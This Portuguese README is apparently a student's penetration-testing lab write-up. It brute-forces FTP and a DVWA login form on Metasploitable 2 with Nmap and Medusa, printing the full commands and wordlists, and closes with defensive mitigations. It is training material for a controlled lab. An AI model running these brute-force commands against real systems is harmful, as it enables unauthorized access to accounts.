# 🛡️ Auditoria de Segurança e Brute Force com Kali Linux e Medusa

Este repositório documenta um projeto prático de simulação de ataques de força bruta em ambientes vulneráveis controlados, utilizando o **Kali Linux** e a ferramenta **Medusa**. O objetivo principal é demonstrar o processo de enumeração e quebra de credenciais em serviços comuns (FTP e HTTP Form) e estabelecer políticas de mitigação.

## 🎯 Escopo do Projeto
- Configuração de um laboratório de testes isolado utilizando VirtualBox (rede Host-only).
- Implementação de Snapshots de segurança das VMs para garantir a integridade do ambiente.
- Execução de auditorias de senhas contra serviços FTP e formulários web (DVWA).
- Análise da eficácia de dicionários (wordlists) customizados.
- Proposição de recomendações de mitigação de riscos (Blue Team).

## 🛠️ Ambiente e Ferramentas
- **Sistema Atacante:** Kali Linux
- **Sistema Alvo:** Metasploitable 2 (IP: `192.168.56.101`)
- **Ferramentas:** Nmap, Medusa, Bash
- **Virtualização:** Oracle VM VirtualBox

---

## 🚀 Execução da Auditoria

### 1. Reconhecimento Prévio (Footprinting)
O primeiro passo foi identificar quais portas e serviços estavam abertos no servidor alvo. Para isso, foi utilizado o Nmap:
```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```
*Resultado:* Identificado o serviço `vsftpd 2.3.4` rodando na porta 21 (FTP), além dos serviços SSH e HTTP. Foi confirmado o acesso anônimo/tela de login via FTP.

![Nmap Portscan Results](images/nmap-recon-portscan.png)

### 2. Geração das Wordlists
Para otimizar o ataque, foram criadas duas wordlists customizadas diretamente via terminal com senhas e usuários padrão da indústria:
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > User.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > Pass.txt
```

![Echo Commands to Create Wordlists](images/prepare-wordlists-kali.png)

### 3. Cenário A: Força Bruta em Serviço FTP
O protocolo FTP (Porta 21) frequentemente sofre com ataques de dicionário devido à falta de mecanismos de bloqueio padrão em sistemas legados. Utilizando o Medusa, o ataque foi paralelizado com 6 threads (`-t 6`):
```bash
medusa -h 192.168.56.101 -U User.txt -P Pass.txt -M ftp -t 6
```
**Resultado:** Sucesso. O Medusa validou as credenciais `msfadmin:msfadmin` na porta 21, demonstrando a fragilidade das configurações de fábrica.

![Medusa FTP Attack Success](images/medusa-ftp-attack-success.png)

### 4. Cenário B: Força Bruta em Formulário Web (DVWA)
Visando explorar falhas de autenticação em aplicações web, o teste foi direcionado para a página de login do Damn Vulnerable Web Application (DVWA) rodando no IP do laboratório:
```bash
medusa -h 192.168.56.101 -U User.txt -P Pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
**Resultado:** Sucesso. Credenciais válidas interceptadas por meio de requisições HTTP POST automatizadas, contornando a tela de login.

![Medusa HTTP Form Success](images/dvwa-web-login-success.png)

---

## 🛡️ Mitigação e Boas Práticas (Blue Team)

A exposição demonstrada neste laboratório reforça a necessidade de arquiteturas defensivas sólidas. Para proteger a infraestrutura contra os vetores explorados, recomenda-se:

1. **Gestão de Identidade:** Alteração imediata de credenciais padrão (`default credentials`) antes de colocar qualquer servidor em produção.
2. **Account Lockout:** Implementação de políticas de bloqueio de conta após um número específico de tentativas falhas de login.
3. **Múltiplos Fatores de Autenticação (MFA):** Exigência de MFA para qualquer serviço exposto externamente ou sistemas críticos internos.
4. **Substituição de Protocolos em Texto Claro:** Migração de serviços FTP convencionais para SFTP (SSH File Transfer Protocol), garantindo criptografia ponta a ponta.
5. **IPS / WAF:** Utilização de ferramentas como Fail2Ban para serviços de infraestrutura e um Web Application Firewall (WAF) para bloquear ataques de força bruta HTTP na camada de aplicação.

---
*Projeto desenvolvido por Luan Francisco Savarese como evidência prática de proficiência em testes de penetração e auditoria de sistemas.*
